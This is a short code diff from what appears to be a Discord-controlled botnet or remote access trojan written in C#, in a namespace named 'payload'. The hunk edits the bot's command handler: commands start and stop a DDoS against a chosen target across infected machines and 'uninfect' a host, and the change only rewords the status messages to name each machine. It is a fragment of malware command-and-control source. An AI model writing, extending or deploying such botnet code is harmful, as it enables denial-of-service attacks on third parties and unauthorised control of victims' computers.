@@ -251,19 +251,19 @@ namespace payload
                     {
                         ddos = true;
                         toddos = args[0];
-                        await message.Channel.SendMessageAsync($"DDOS started on all machines.");
+                        await message.Channel.SendMessageAsync($"DDOS started on {Environment.MachineName}.");
                         break;
                     }
                 case "stopddos":
                     {
                         ddos = false;
                         toddos = string.Empty;
-                        await message.Channel.SendMessageAsync($"DDOS stopped on all machines.");
+                        await message.Channel.SendMessageAsync($"DDOS stopped on {Environment.MachineName}.");
                         break;
                     }
                 case "uninfect":
                     {
-                        await message.Channel.SendMessageAsync($"Attempted to uninfect {Environment.MachineName}");
+                        await message.Channel.SendMessageAsync($"Attempted to uninfect {Environment.MachineName}.");
                         if (message.Channel.Name != "all-machines") await (message.Channel as SocketTextChannel).DeleteAsync();
                         Utils.Uninfect();
                         break;
